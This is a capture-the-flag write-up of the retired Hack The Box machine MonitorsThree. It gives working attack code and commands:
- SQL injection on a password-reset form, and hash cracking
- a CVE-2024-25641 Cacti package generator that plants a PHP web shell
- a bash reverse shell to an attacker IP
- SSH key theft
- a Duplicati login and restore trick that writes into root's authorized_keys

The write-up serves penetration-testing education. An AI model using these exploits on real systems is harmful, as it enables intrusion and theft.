---
title: "Hack The Box — MonitorsThree"
summary: "MonitorsThree chains password-reset SQL injection, Cacti package import, reused credentials and a Duplicati restore into root SSH access on Linux."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Medium"
os: "Linux"
solvedAt: 2026-11-13
publishedAt: 2026-11-13
tags:
  - sql-injection
  - cacti
  - cve-2024-25641
  - password-cracking
  - ssh
  - duplicati
  - privilege-escalation
tools:
  - Nmap
  - ffuf
  - sqlmap
  - PHP
  - Hashcat
  - SSH
  - SQLite
cves:
  - CVE-2024-25641
htbUrl: "https://app.hackthebox.com/machines/622"
cover: "/images/writeups/hackthebox/machines/monitorsthree/cover.png"
coverAlt: "Hack The Box MonitorsThree machine artwork with a three-eyed cactus"
featured: false
draft: false
---

> This write-up covers the retired Hack The Box machine MonitorsThree. I confirmed its Retired listing before preparing this article. Addresses, flags, private keys, session cookies and the Duplicati passphrase are omitted. Replace the angle-bracketed values with those from your own lab session.

## Executive summary

The password-reset form on the main site has a blind SQL injection. I used it to recover an administrator credential, found the Cacti virtual host, and logged into Cacti 1.2.26. Its package importer is affected by CVE-2024-25641: it accepts a signed package whose file entry writes PHP into a web-accessible directory. That yielded command execution as `www-data`. Cacti's database configuration then exposed a database account; a bcrypt hash in `user_auth` led to the `marcus` password. SSH required a key, so I changed to `marcus` locally and retrieved his private key. Finally, a localhost-only Duplicati instance ran as root with the host filesystem mounted at `/source`. Its database passphrase enabled a web login, and a backup restore placed my public key in root's `authorized_keys`.

## Target information

| Item | Value |
| --- | --- |
| Target | MonitorsThree |
| Platform | Hack The Box |
| Difficulty | Medium |
| Operating system | Linux |
| Publication policy | Retired |
| Main web host | `monitorsthree.htb` |
| Cacti host | `cacti.monitorsthree.htb` |

I used these placeholders throughout:

```bash
export TARGET_IP='<TARGET_IP>'
export ATTACKER_IP='<ATTACKER_VPN_IP>'
```

Add the virtual hosts to `/etc/hosts` after confirming the target IP:

```bash
echo "$TARGET_IP monitorsthree.htb cacti.monitorsthree.htb" | sudo tee -a /etc/hosts
```

## Enumeration

A full TCP scan found SSH and HTTP. Port 8084 appeared filtered and did not provide an initial route in this solve:

```bash
nmap -sC -sV -p- "$TARGET_IP"
```

| Port | Observation | Next step |
| --- | --- | --- |
| 22/tcp | OpenSSH 8.9p1 on Ubuntu | Keep for later authenticated access |
| 80/tcp | nginx 1.18.0, redirect to `monitorsthree.htb` | Inspect the web application and virtual hosts |
| 8084/tcp | Filtered | No reachable service to investigate yet |

The main site exposed a login form and a **Forgot password?** link. The latter submitted a `username` field to `/forgot_password.php`. I also checked for HTTP virtual hosts; the Cacti host became relevant after obtaining credentials:

```bash
ffuf -ac -u "http://$TARGET_IP/" \
  -H 'Host: FUZZ.monitorsthree.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

The useful result was `cacti.monitorsthree.htb`, serving Cacti at `/cacti/`. A `Host` header matters here: requesting the IP alone reaches the default virtual host.

## Initial access: password-reset SQL injection

I submitted a test username in the password-reset form and saved the POST in `forgot.req` with Burp Suite. The important parts of the request were:

```http
POST /forgot_password.php HTTP/1.1
Host: monitorsthree.htb
Content-Type: application/x-www-form-urlencoded

username=ilias
```

`sqlmap` confirmed that the POST `username` parameter was injectable with a MySQL time-based blind technique. Because the application redirects after POST, I followed the redirect while keeping the original POST data when prompted:

```bash
sqlmap -r forgot.req -p username --batch --dbms=mysql --technique=T \
  -D monitorsthree_db -T users -C username,password --dump
```

On this target, extraction through `SLEEP()` was slow. Restricting the database, table and columns avoids spending time dumping unrelated data. If you already know the row of interest, add `--where="username='admin'"`. The result supplied the administrator password hash. Identify its type before cracking it; a 32-character hexadecimal MD5 digest can be tested with Hashcat mode `0`:

```bash
printf '%s\n' '<ADMIN_HASH_FROM_SQLMAP>' > admin.hash
hashcat -m 0 -a 0 admin.hash /usr/share/wordlists/rockyou.txt
hashcat -m 0 admin.hash --show
```

I used the recovered administrator password at `http://cacti.monitorsthree.htb/cacti/`. The console identified the installed version as **1.2.26**.

## Cacti package import to `www-data`

[Cacti's advisory for CVE-2024-25641](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) says versions through 1.2.26 allow an authenticated user with package-import rights to write attacker-controlled file content. The package contains a file name and data; the importer trusts both. Version 1.2.27 contains the fix.

I adapted the advisory's package generator to create a small command runner. Save this as `make-package.php` on Kali and run `php make-package.php`:

```php
<?php
$xml = '<xml><files><file><name>resource/test.php</name>' .
       '<data>%s</data><filesignature>%s</filesignature></file></files>' .
       '<publickey>%s</publickey><signature></signature></xml>';
$file = '<?php echo shell_exec($_GET["cmd"] ?? "id"); ?>';
$key = openssl_pkey_new();
$public = openssl_pkey_get_details($key)['key'];
openssl_sign($file, $fileSignature, $key, OPENSSL_ALGO_SHA256);
$unsigned = sprintf(
    $xml,
    base64_encode($file),
    base64_encode($fileSignature),
    base64_encode($public)
);
openssl_sign($unsigned, $packageSignature, $key, OPENSSL_ALGO_SHA256);
$signed = str_replace(
    '<signature></signature>',
    '<signature>' . base64_encode($packageSignature) . '</signature>',
    $unsigned
);
file_put_contents('test.xml.gz', gzencode($signed, 9));
```

In Cacti, open **Import/Export → Import Packages**, upload `test.xml.gz`, select the offered `resource/test.php` file and complete the import. The file was marked writable and new. I verified execution before attempting a shell:

```bash
curl -G --data-urlencode 'cmd=id' \
  'http://cacti.monitorsthree.htb/cacti/resource/test.php'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Start a listener on Kali, then use the command runner to connect back. The address is your HTB VPN interface address, never the target's address:

```bash
nc -lvnp 4444
```

```bash
curl -G \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1'" \
  'http://cacti.monitorsthree.htb/cacti/resource/test.php'
```

The listener received a shell as `www-data`. The usual `no job control` message is expected for this kind of reverse shell.

## From Cacti's database to `marcus`

Cacti's configuration gave the application database name and its local database account:

```bash
grep -E 'database_(default|hostname|username|password)' \
  /var/www/html/cacti/include/config.php
```

Use the values you find there to query the Cacti user table. On this machine, the application account was `cactiuser` for database `cacti`:

```bash
mysql -h localhost -u cactiuser -p cacti \
  -e "SELECT username,password FROM user_auth WHERE username='marcus';"
```

Enter the password shown in `config.php` when prompted. The `marcus` entry was a bcrypt digest (`$2y$10$...`). I cracked that single hash offline:

```bash
printf '%s\n' '<MARCUS_BCRYPT_HASH>' > marcus.hash
hashcat -m 3200 -a 0 marcus.hash /usr/share/wordlists/rockyou.txt
hashcat -m 3200 marcus.hash --show
```

The recovered lab password was `12345678910`. Direct `ssh marcus@<TARGET_IP>` failed with `Permission denied (publickey)` because SSH did not accept password authentication. From the existing shell, however, `su marcus` accepted the password. I upgraded the shell enough to interact with `su`, then read the user's SSH key:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su marcus
id
ls -la ~/.ssh
cat ~/.ssh/id_rsa
```

Save the retrieved key to `marcus_id_rsa` on Kali, restrict its permissions, and reconnect:

```bash
chmod 600 marcus_id_rsa
ssh -i marcus_id_rsa marcus@"$TARGET_IP"
```

`sudo -l` showed that `marcus` had no sudo rights, so I continued enumerating local services and installed applications.

## Privilege escalation: Duplicati

The root-owned compose file at **`/opt/docker-compose.yml`** described a Duplicati container. Its relevant settings were:

```yaml
environment:
  - PUID=0
  - PGID=0
volumes:
  - /opt/duplicati/config:/config
  - /:/source
ports:
  - 127.0.0.1:8200:8200
```

This is the critical trust boundary. The web UI was bound to loopback, but the container ran as root and could write to the host filesystem through `/source`. I forwarded the local port over SSH from Kali and opened `http://127.0.0.1:8200/`:

```bash
ssh -i marcus_id_rsa -N -L 8200:127.0.0.1:8200 marcus@"$TARGET_IP"
```

The UI required a password. I copied the readable Duplicati SQLite database to Kali and queried its `Option` table:

```bash
scp -i marcus_id_rsa \
  marcus@"$TARGET_IP":/opt/duplicati/config/Duplicati-server.sqlite .
sqlite3 -noheader Duplicati-server.sqlite \
  "SELECT Value FROM Option WHERE Name='server-passphrase';"
```

The value is a base64-encoded *server passphrase*, not a plaintext UI password. The behavior documented in [Duplicati issue 5197](https://github.com/duplicati/duplicati/issues/5197) allowed that value to authenticate: decode it, request a fresh nonce, then send a SHA-256 response built from the nonce and passphrase bytes. I used this browser-console code on the forwarded Duplicati login page, replacing the placeholder with the value from my own database:

```javascript
(async () => {
  const passphrase = '<BASE64_SERVER_PASSPHRASE_FROM_SQLITE>';
  const endpoint = new URL('login.cgi', location.href);
  const nonceResponse = await fetch(endpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ 'get-nonce': '1' }),
    credentials: 'same-origin'
  });
  const { Nonce } = await nonceResponse.json();
  const decode = value => Uint8Array.from(atob(value), c => c.charCodeAt(0));
  const nonce = decode(Nonce);
  const secret = decode(passphrase);
  const combined = new Uint8Array(nonce.length + secret.length);
  combined.set(nonce);
  combined.set(secret, nonce.length);
  const digest = new Uint8Array(await crypto.subtle.digest('SHA-256', combined));
  const token = btoa(String.fromCharCode(...digest));
  const login = await fetch(endpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ password: token }),
    credentials: 'same-origin'
  });
  console.log('Login HTTP status:', login.status);
  if (login.ok) location.href = '/ngax/index.html';
})();
```

Use the passphrase *once* inside the function; repeatedly declaring `const passphrase` at the top level of the same browser console produces `SyntaxError: redeclaration of const passphrase`. A new nonce is required for each login attempt. In my solve, the successful request opened the Duplicati dashboard.

### Write root's SSH authorization through backup restore

I generated a fresh key pair on Kali and sent **only the public key** to a temporary file on the target:

```bash
ssh-keygen -t ed25519 -f ./htb_root -N ''
scp -i marcus_id_rsa ./htb_root.pub marcus@"$TARGET_IP":/tmp/authorized_keys
```

In Duplicati, I created a small backup named `root-key-backup`:

1. **Add backup → Configure a new backup**. Select **No encryption**.
2. Set a local-folder destination such as `/source/tmp/htb-root-backup`.
3. On **Source Data**, use **Add a path directly** and add `/source/tmp/authorized_keys`. The `/source` prefix is essential because the container sees the host filesystem there.
4. Finish the wizard and run the backup once. The dashboard should show a successful backup of roughly one public-key file.

Then use **Restore** on that backup. Select `authorized_keys`, choose a different restore location under `/source/root/.ssh/`, and use the path or folder-structure options so the final container path is exactly `/source/root/.ssh/authorized_keys`. If the UI offers an overwrite option, enable it. Verify the resulting host file at `/root/.ssh/authorized_keys`. [Duplicati's restore guide](https://docs.duplicati.com/getting-started/restoring-files) documents the restore workflow.

The first SSH attempt failed because backing up a file did **not** automatically install it as root's `authorized_keys`. Restoring it to the exact host path resolved the issue. I verified access using the matching private key:

```bash
chmod 600 ./htb_root
ssh -i ./htb_root root@"$TARGET_IP"
id
# uid=0(root) gid=0(root) groups=0(root)
```

No flag value or private-key material is needed to demonstrate the result.

## What did not work

- Direct password-based SSH for `marcus` returned `Permission denied (publickey)`; the password was still useful for local `su`.
- `sudo -l` for `marcus` showed no permitted commands.
- `/opt/duplicati/docker-compose.yml` did not exist. The actual compose file was `/opt/docker-compose.yml`.
- Sending Duplicati's base64 server passphrase as an ordinary login password returned HTTP 401. The nonce-based response was required.
- Running the new Duplicati backup alone did not change root's SSH configuration. A restore to `/source/root/.ssh/authorized_keys` was the decisive write.

## Attack path

1. Enumerate TCP services and the `monitorsthree.htb` web application.
2. Exploit blind SQL injection in the forgot-password `username` field to recover the administrator credential.
3. Discover the Cacti virtual host and log into its 1.2.26 console.
4. Import a signed package exploiting CVE-2024-25641 to execute PHP as `www-data`.
5. Read Cacti database configuration, crack `marcus`' bcrypt hash, and use `su` to access his SSH key.
6. Forward the loopback Duplicati port and authenticate using the database server passphrase.
7. Restore an attacker-controlled public key through Duplicati's root-mounted `/source` volume, then log in as root.

## Lessons learned

- A slow blind injection is still useful when extraction is narrowed to the needed table and columns.
- Cacti's package signature did not establish trust in the package creator; the importer accepted an attacker-generated key and signed payload. Restrict import rights and update past 1.2.26.
- Password reuse let a database hash become a local user password even though SSH password authentication was disabled.
- Binding an administrative UI to loopback did not protect it once a local user could tunnel to it and read its database. A root container with `/:/source` could write host root files. Remove that broad mount and run the backup service with only the filesystem permissions it needs.

## References

- [Hack The Box — MonitorsThree](https://app.hackthebox.com/machines/622)
- [Cacti advisory GHSA-7cmj-g5qc-pj88 / CVE-2024-25641](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88)
- [sqlmap usage documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [Duplicati issue 5197: login with database server passphrase](https://github.com/duplicati/duplicati/issues/5197)
- [Duplicati: restoring files](https://docs.duplicati.com/getting-started/restoring-files)
